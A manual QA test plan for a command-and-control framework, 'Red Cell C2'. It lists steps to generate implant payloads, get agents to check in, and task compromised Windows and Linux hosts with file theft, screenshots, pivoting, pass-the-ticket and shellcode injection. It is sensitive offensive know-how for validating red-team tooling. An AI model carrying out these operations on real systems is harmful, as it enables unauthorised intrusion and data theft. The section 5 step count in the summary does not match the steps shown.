# Red Cell C2 — Manual Test Plan

This document is the operator-driven validation checklist for Red Cell C2. Execute each
numbered step in sequence, record the actual outcome, and mark each item **PASS** or
**FAIL**. Every section is independent; you may run them in any order unless a dependency
is noted.

---

## Prerequisites

| Item | Detail |
|------|--------|
| Teamserver profile | `profiles/havoc.yaotl` (or a custom `.yaotl`) |
| Operator credentials | At least one Admin, one Operator, one Analyst account |
| Test machines | Ubuntu Desktop (latest LTS) — `linux-test`; Windows 11 — `windows-test` |
| Demon binary | Pre-compiled Demon `.exe` for the Windows target |
| Phantom binary | `cargo build --release --target x86_64-unknown-linux-gnu` in `agent/phantom/` |
| Python plugin | A minimal `.py` plugin that registers one custom command (see `§8`) |
| Netstat / ss | Available on the teamserver host for port verification |
| `red-cell-cli` | Built and on `PATH`; `RC_SERVER` / `RC_TOKEN` env vars set for Admin |

---

## 1. Auth & RBAC

> **Goal:** verify login flow, token lifetime, and role enforcement across all three roles.

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 1.1 | `red-cell-cli status` with no token | Exit code `3`; stderr JSON `{"ok":false,"error":"AUTH_FAILURE"}` | |
| 1.2 | Login as **Admin** via `red-cell-cli`; store token | Exit code `0`; token returned in `data.token` | |
| 1.3 | Login as **Operator** via `red-cell-cli`; store token | Exit code `0`; token returned | |
| 1.4 | Login as **Analyst** via `red-cell-cli`; store token | Exit code `0`; token returned | |
| 1.5 | Login with correct username, **wrong password** | Exit code `3`; `AUTH_FAILURE` error | |
| 1.6 | Login with **non-existent** username | Exit code `3`; `AUTH_FAILURE` error (no user-enumeration hint) | |
| 1.7 | Submit 6+ consecutive bad-password requests from the same IP within 60 s | Requests 6+ return HTTP 429 / exit code `3` with rate-limit message | |
| 1.8 | As **Analyst**: `red-cell-cli agent list` | Exit code `0`; JSON array returned (read access) | |
| 1.9 | As **Analyst**: `red-cell-cli listener create ...` | Exit code `3`; `PERMISSION_DENIED` — Analyst cannot manage listeners | |
| 1.10 | As **Analyst**: `red-cell-cli agent exec <id> --cmd whoami` | Exit code `3`; `PERMISSION_DENIED` — Analyst cannot task agents | |
| 1.11 | As **Operator**: `red-cell-cli listener create ...` | Exit code `0`; listener created (Operator has ManageListeners) | |
| 1.12 | As **Operator**: `red-cell-cli operator create ...` | Exit code `3`; `PERMISSION_DENIED` — only Admin can manage operators | |
| 1.13 | As **Admin**: `red-cell-cli operator create --username testuser --role Analyst` | Exit code `0`; operator appears in `operator list` | |
| 1.14 | As **Admin**: `red-cell-cli operator delete testuser` | Exit code `0`; testuser absent from `operator list` | |
| 1.15 | Use an **expired / revoked token** (stop + restart teamserver, re-check old token) | Exit code `3`; `AUTH_FAILURE` | |
| 1.16 | WebSocket connection with valid Operator token | Client connects; event stream begins | |
| 1.17 | WebSocket connection with invalid token | Connection rejected (HTTP 401 on upgrade) | |

---

## 2. Listeners

> **Goal:** full lifecycle for every listener type; port reachability; TLS.

### 2a. HTTP Listener

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 2.1 | `listener create --name http-test --type Http --port 8080 --host 0.0.0.0` | Exit `0`; listener in `listener list` with status `Stopped` | |
| 2.2 | `listener start http-test` | Exit `0`; status becomes `Online` | |
| 2.3 | `ss -tlnp \| grep 8080` on teamserver host | Port 8080 is LISTEN | |
| 2.4 | `curl -s http://localhost:8080/` | Returns HTTP response (any status acceptable; no connection refused) | |
| 2.5 | `listener stop http-test` | Exit `0`; status becomes `Stopped` | |
| 2.6 | `ss -tlnp \| grep 8080` after stop | Port 8080 no longer LISTEN | |
| 2.7 | `listener delete http-test` | Exit `0`; listener absent from `listener list` | |

### 2b. HTTP Listener — TLS

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 2.8 | Create HTTP listener with TLS cert/key paths pointing to `profiles/havoc.tls.crt` and `profiles/havoc.tls.key` | Listener created | |
| 2.9 | Start listener; `curl -sk https://localhost:<port>/` | Returns HTTP response; no TLS handshake error | |
| 2.10 | `openssl s_client -connect localhost:<port> -showcerts` | Shows certificate CN matching the profile cert | |
| 2.11 | Stop and delete TLS listener | Listener removed cleanly | |

### 2c. DNS Listener

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 2.12 | `listener create --name dns-test --type Dns --port 5353 --host 0.0.0.0` | Exit `0`; status `Stopped` | |
| 2.13 | `listener start dns-test` | Exit `0`; status `Online` | |
| 2.14 | `ss -ulnp \| grep 5353` on teamserver host | UDP port 5353 is LISTEN | |
| 2.15 | `listener stop dns-test` then `listener delete dns-test` | Clean removal | |

### 2d. SMB Listener

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 2.16 | `listener create --name smb-test --type Smb --pipe red-cell-pipe` | Exit `0`; listener shows in list | |
| 2.17 | `listener start smb-test` | Exit `0`; status `Online` | |
| 2.18 | `listener stop smb-test` then `listener delete smb-test` | Clean removal | |

### 2e. Duplicate / Conflict

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 2.19 | Create two HTTP listeners bound to the same port; start both | Second `start` returns an error; only one listener owns the port | |
| 2.20 | Delete a listener while it is running | Listener is stopped then deleted; port released | |

---

## 3. Payload Generation

> **Goal:** every format × architecture combination produces a valid output file.

| # | Arch | Format | Step | Expected outcome | Result |
|---|------|--------|------|-----------------|--------|
| 3.1 | x64 | Exe | `payload build --listener http-test --arch x64 --format exe` | Exit `0`; job completes; downloaded file is a valid PE (`MZ` header) | |
| 3.2 | x86 | Exe | same, `--arch x86 --format exe` | Valid 32-bit PE | |
| 3.3 | x64 | Dll | `--arch x64 --format dll` | Valid PE DLL; `file` reports `DLL` | |
| 3.4 | x86 | Dll | `--arch x86 --format dll` | Valid 32-bit PE DLL | |
| 3.5 | x64 | Shellcode | `--arch x64 --format shellcode` | Exit `0`; binary blob; not a PE header | |
| 3.6 | x86 | Shellcode | `--arch x86 --format shellcode` | Binary blob | |
| 3.7 | x64 | StagedShellcode | `--arch x64 --format staged_shellcode` | Exit `0`; binary blob | |
| 3.8 | x64 | RawShellcode | `--arch x64 --format raw_shellcode` | Exit `0`; binary blob (x64 only — no x86 DllLdr) | |
| 3.9 | x86 | RawShellcode | `--arch x86 --format raw_shellcode` | **Error** returned; x86 raw shellcode is unsupported | |
| 3.10 | — | Invalid arch | `--arch arm64 --format exe` | `BUILD_ERROR` or argument error; no file produced | |
| 3.11 | — | Invalid format | `--arch x64 --format bogus` | `BUILD_ERROR` or argument error | |
| 3.12 | — | List cached payloads | `payload list` | Returns JSON array; each entry has `id`, `arch`, `format`, `listener` | |
| 3.13 | — | Download cached payload | `payload download <id> --out /tmp/test.exe` | File written; sha256 matches build artifact | |

---

## 4. Agent Connection

> **Goal:** Demon and Phantom agents check in and appear in the agent registry.

### 4a. Linux — Phantom

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 4.1 | Start an HTTP listener on the teamserver (port 443 or 8080) | Listener `Online` | |
| 4.2 | SCP Phantom binary to `linux-test` | File present on target | |
| 4.3 | On `linux-test`: `./phantom --server <teamserver-ip>:<port>` | Process starts; no immediate crash | |
| 4.4 | `red-cell-cli agent list` within 10 s | New agent entry with `os: Linux`; `hostname` matches target | |
| 4.5 | `red-cell-cli agent show <id>` | Returns `arch`, `pid`, `user`, `internal_ip`, `external_ip`, `sleep`, `jitter` | |
| 4.6 | Agent entry shows `last_seen` updated within sleep interval | `last_seen` ≤ `sleep + jitter` seconds ago | |

### 4b. Windows — Demon

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 4.7 | SCP Demon `.exe` to `windows-test` | File present | |
| 4.8 | On `windows-test`: execute the Demon `.exe` | Process starts | |
| 4.9 | `red-cell-cli agent list` within 10 s | New agent entry with `os: Windows`; hostname matches | |
| 4.10 | `red-cell-cli agent show <id>` | Returns correct OS / arch metadata | |
| 4.11 | Teamserver logs show `agent_registered` event | `tracing` log line visible in teamserver stdout | |
| 4.12 | Both Linux and Windows agents visible simultaneously | `agent list` shows two distinct agents | |

---

## 5. Command Dispatch

> **Prerequisite:** at least one running agent from §4 (mix of Linux and Windows where noted).

### 5a. Shell Execution

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.1 | `agent exec <linux-id> --cmd "id" --wait` | Output contains `uid=` | |
| 5.2 | `agent exec <win-id> --cmd "whoami" --wait` | Output contains `DOMAIN\user` or `hostname\user` | |
| 5.3 | `agent exec <id> --cmd "sleep 30" --wait --wait-timeout 5` | Exit code `5` (timeout) | |
| 5.4 | `agent exec <id>` with empty `--cmd` | Error returned; no task queued | |

### 5b. Filesystem

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.5 | `agent exec <linux-id> --cmd "ls /tmp"` | Directory listing returned | |
| 5.6 | `agent exec <win-id> --cmd "dir C:\\"` | Directory listing returned | |
| 5.7 | `agent exec <linux-id> --cmd "cat /etc/hostname"` | Hostname printed | |
| 5.8 | `agent exec <linux-id> --cmd "mkdir /tmp/rc-test && echo ok"` | `ok` returned; directory created | |

### 5c. File Transfer — Upload

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.9 | Create `/tmp/upload-src.txt` (100 B) on operator host | File exists | |
| 5.10 | `agent upload <linux-id> --src /tmp/upload-src.txt --dst /tmp/upload-dst.txt` | Exit `0`; no error | |
| 5.11 | `agent exec <linux-id> --cmd "sha256sum /tmp/upload-dst.txt" --wait` | Hash matches local file | |
| 5.12 | Upload a 10 MB binary to Windows agent | Exit `0`; file present on target | |

### 5d. File Transfer — Download

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.13 | `agent download <linux-id> --src /etc/hostname --dst /tmp/dl-hostname.txt` | Exit `0`; file written locally | |
| 5.14 | `sha256sum /tmp/dl-hostname.txt` matches `agent exec --cmd "sha256sum /etc/hostname"` | Hashes equal | |
| 5.15 | Loot entry created automatically (see §7 for detail) | `loot list` shows the download | |
| 5.16 | Download a 10 MB file from Windows agent | Completes without corruption | |

### 5e. Screenshot

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.17 | `agent exec <win-id> --cmd "screenshot" --wait` | Exit `0`; output is a base64 PNG or a download path | |
| 5.18 | Loot entry created for the screenshot | `loot list` shows type `screenshot` | |
| 5.19 | Download loot item; open PNG | Valid PNG; shows desktop | |

### 5f. Process List & Kill

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.20 | `agent exec <linux-id> --cmd "ps" --wait` | JSON array of running processes with `pid`, `name`, `user` | |
| 5.21 | `agent exec <win-id> --cmd "ps" --wait` | Windows process list returned | |
| 5.22 | Start `sleep 9999` on `linux-test`; record its PID | Process visible in process list | |
| 5.23 | `agent exec <linux-id> --cmd "kill <pid>" --wait` | Exit `0`; `sleep 9999` no longer in process list | |
| 5.24 | `agent kill <linux-id>` | Exit `0`; agent status becomes `dead`/absent in list after next heartbeat | |

### 5g. Network

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.25 | `agent exec <linux-id> --cmd "netstat" --wait` | Returns active connections / listening ports | |
| 5.26 | `agent exec <win-id> --cmd "netstat" --wait` | Returns active connections | |

### 5h. Pivot Chain Dispatch

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.27 | Upload Demon EXE to `linux-test` via the Linux Phantom agent | File arrives on target | |
| 5.28 | Execute Demon EXE on `linux-test` via Wine or an SMB pivot path | New Windows-protocol agent checks in via SMB listener | |
| 5.29 | `agent exec <pivot-agent-id> --cmd "whoami"` routes through pivot | Output returned via the pivot chain | |

### 5i. Kerberos Token Operations (Windows target only)

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.30 | `agent exec <win-id> --cmd "klist" --wait` | Returns Kerberos ticket list or `no tickets` | |
| 5.31 | Pass-the-Ticket: import a `.kirbi` file via file upload then `kerberos ptt` command | Exit `0`; ticket visible in `klist` output | |
| 5.32 | Purge Kerberos tickets: `kerberos purge` | Tickets cleared | |

### 5j. Code Injection

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 5.33 | `agent exec <win-id> --cmd "inject --pid <notepad-pid> --shellcode <base64>"` | Injection returns `0` exit; shellcode runs in target PID | |
| 5.34 | Injection into a non-existent PID | Error message; no crash on teamserver | |

---

## 6. Events & Chat

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 6.1 | Connect GUI client as Admin; monitor event stream | Events panel updates in real time | |
| 6.2 | Start a listener while monitoring | `listener_started` event appears immediately in client | |
| 6.3 | New agent checks in | `agent_registered` event appears; agent shows in sidebar | |
| 6.4 | Send a chat message as Admin via GUI or `red-cell-cli session` | Message visible to all connected operators | |
| 6.5 | Second operator (Operator role) connected simultaneously; Admin sends chat | Message visible to second operator's client | |
| 6.6 | Second operator replies | Reply visible to Admin | |
| 6.7 | `red-cell-cli log tail --watch` streams events | New events appear in stdout as they occur (Ctrl-C to stop) | |
| 6.8 | Disconnect one client; send chat; reconnect | Reconnected client does **not** replay missed messages (no replay guarantee) | |

---

## 7. Loot & Audit

### 7a. Loot

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 7.1 | Download a file from any agent (see §5d) | `GET /api/v1/loot` returns entry with correct `agent_id`, `path`, `size` | |
| 7.2 | Take a screenshot (see §5e) | Loot entry with `type: screenshot` created | |
| 7.3 | `red-cell-cli` retrieves loot: `loot list` | JSON array; matches items 7.1 and 7.2 | |
| 7.4 | `GET /api/v1/loot/<id>` | Returns full loot record | |
| 7.5 | Download loot bytes: `GET /api/v1/loot/<id>/download` | Binary content; sha256 matches original file | |

### 7b. Audit Log

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 7.6 | Login as any operator | `GET /api/v1/audit` shows `login` entry with `operator`, `timestamp`, `result: success` | |
| 7.7 | Failed login attempt | Audit entry with `result: failure` | |
| 7.8 | Create a listener | Audit entry for `listener_create` with listener name and operator | |
| 7.9 | Start a listener | Audit entry for `listener_start` | |
| 7.10 | Stop a listener | Audit entry for `listener_stop` | |
| 7.11 | Delete a listener | Audit entry for `listener_delete` | |
| 7.12 | Queue an agent task | Audit entry for `agent_task` with command type | |
| 7.13 | Download a file | Audit entry for `agent_download` | |
| 7.14 | Create an operator | Audit entry for `operator_create` | |
| 7.15 | Delete an operator | Audit entry for `operator_delete` | |
| 7.16 | Filter by operator: `GET /api/v1/audit?operator=<name>` | Only entries for that operator returned | |
| 7.17 | Filter by result: `GET /api/v1/audit?result_status=failure` | Only failed actions returned | |
| 7.18 | Analyst reads audit log | `GET /api/v1/audit` succeeds (read access) | |
| 7.19 | Unauthenticated request to audit log | HTTP 401 | |
| 7.20 | `red-cell-cli log list` returns same entries | JSON matches REST endpoint | |

---

## 8. Plugins & REST API

### 8a. Python Plugin

> Create a minimal plugin file `test_plugin.py`:
>
> ```python
> def register(api):
>     api.register_command("ping-plugin", "Returns pong", lambda agent, args: "pong")
> ```

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 8.1 | `red-cell-cli` or GUI: load plugin `test_plugin.py` | Plugin loaded without error | |
| 8.2 | `red-cell-cli agent exec <id> --cmd "ping-plugin" --wait` | Output `pong` returned | |
| 8.3 | Reload plugin after modifying the `register` function | Updated command behaviour reflected | |
| 8.4 | Load a plugin with a syntax error | Error reported; other plugins / system unaffected | |
| 8.5 | Unload plugin `test_plugin` | `ping-plugin` no longer available | |

### 8b. REST API — Core Endpoints

| # | Endpoint | Method | Authenticated as | Expected outcome | Result |
|---|----------|--------|-----------------|-----------------|--------|
| 8.6 | `GET /api/v1/agents` | GET | Analyst | `200`; JSON array | |
| 8.7 | `GET /api/v1/agents/<id>` | GET | Analyst | `200`; agent record | |
| 8.8 | `POST /api/v1/agents/<id>/task` | POST | Operator | `200`; task queued | |
| 8.9 | `POST /api/v1/agents/<id>/task` | POST | Analyst | `403` PERMISSION_DENIED | |
| 8.10 | `DELETE /api/v1/agents/<id>` | DELETE | Operator | `200`; agent killed | |
| 8.11 | `GET /api/v1/listeners` | GET | Analyst | `200`; listener array | |
| 8.12 | `POST /api/v1/listeners` | POST | Operator | `201`; listener created | |
| 8.13 | `POST /api/v1/listeners` | POST | Analyst | `403` | |
| 8.14 | `GET /api/v1/payloads` | GET | Analyst | `200`; payload list | |
| 8.15 | `POST /api/v1/payloads/build` | POST | Operator | `200`; build job started | |
| 8.16 | `GET /api/v1/payloads/jobs/<job_id>` | GET | Operator | `200`; job status | |
| 8.17 | `GET /api/v1/loot` | GET | Analyst | `200`; loot list | |
| 8.18 | `GET /api/v1/audit` | GET | Analyst | `200`; audit page | |
| 8.19 | `GET /api/v1/operators` | GET | Admin | `200`; operator list | |
| 8.20 | `POST /api/v1/operators` | POST | Admin | `201`; operator created | |
| 8.21 | `DELETE /api/v1/operators/<name>` | DELETE | Operator | `403` — Admin only | |
| 8.22 | `GET /api/v1/credentials` | GET | Analyst | `200` | |
| 8.23 | Any protected route, no auth header | GET | — | `401` | |
| 8.24 | `GET /api/v1/webhooks/stats` | GET | Admin | `200`; webhook stats | |

---

## 9. Stability & Edge Cases

| # | Step | Expected outcome | Result |
|---|------|-----------------|--------|
| 9.1 | Send malformed JSON to a REST endpoint | `400 Bad Request`; teamserver does not crash | |
| 9.2 | Send malformed WebSocket message (random bytes) | Connection closed with error; other clients unaffected | |
| 9.3 | Kill a running agent process mid-task | Teamserver marks agent `dead` after missed heartbeats; no panic | |
| 9.4 | Restart teamserver with active agents in DB | Agents restored from DB on restart; operators can reconnect | |
| 9.5 | Simultaneous connections from 5 operators | All receive events; no missed broadcasts | |
| 9.6 | Upload a 0-byte file | Error returned; no crash | |
| 9.7 | Attempt to start a listener that was deleted | `404 Not Found` or equivalent error | |
| 9.8 | Create a payload with a listener that does not exist | `BUILD_ERROR`; no partial artifact written | |

---

## Pass / Fail Summary

After completing all sections, tally results below:

| Section | Total | Pass | Fail | Notes |
|---------|-------|------|------|-------|
| 1. Auth & RBAC | 17 | | | |
| 2. Listeners | 20 | | | |
| 3. Payload Generation | 13 | | | |
| 4. Agent Connection | 12 | | | |
| 5. Command Dispatch | 30 | | | |
| 6. Events & Chat | 8 | | | |
| 7. Loot & Audit | 20 | | | |
| 8. Plugins & REST API | 24 | | | |
| 9. Stability & Edge Cases | 8 | | | |
| **Total** | **152** | | | |

---

*Last updated: 2026-03-29 — covers Red Cell C2 Phase 2 feature set.*
